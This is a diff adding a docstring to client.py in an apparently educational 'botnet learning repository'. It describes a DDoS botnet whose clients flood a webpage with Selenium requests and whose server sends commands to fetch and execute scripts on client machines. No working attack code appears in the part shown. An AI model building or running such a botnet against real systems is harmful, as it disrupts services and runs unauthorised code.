@@ -1,3 +1,21 @@
+'''
+    This script is responsible for simulating a client in a DDoS (Distributed Denial of Service) botnet.
+    It repeatedly sends requests to a specified webpage, emulating a coordinated DDoS attack.
+
+    This botnet learning repository includes the following files:
+
+    - client.py: The main file executed on all the clients, responsible for executing the code in unison and 
+                 sending messages to the webpage over and over.
+
+    - server.py: The server application responsible for orchestrating the botnet and sending commands to the clients.
+                 It sends instructions to the clients, such as fetching and executing scripts.
+
+    - file.py:   The Python script to be executed on the clients upon receiving commands from the server. This script
+                 carries out the desired actions on the client machine, simulating the behavior of a botnet.
+
+    For educational purposes only. Any misuse of the provided code is strictly prohibited.
+'''
+
 # Selenium Imports
 from selenium import webdriver
 from selenium.webdriver.common.by import By
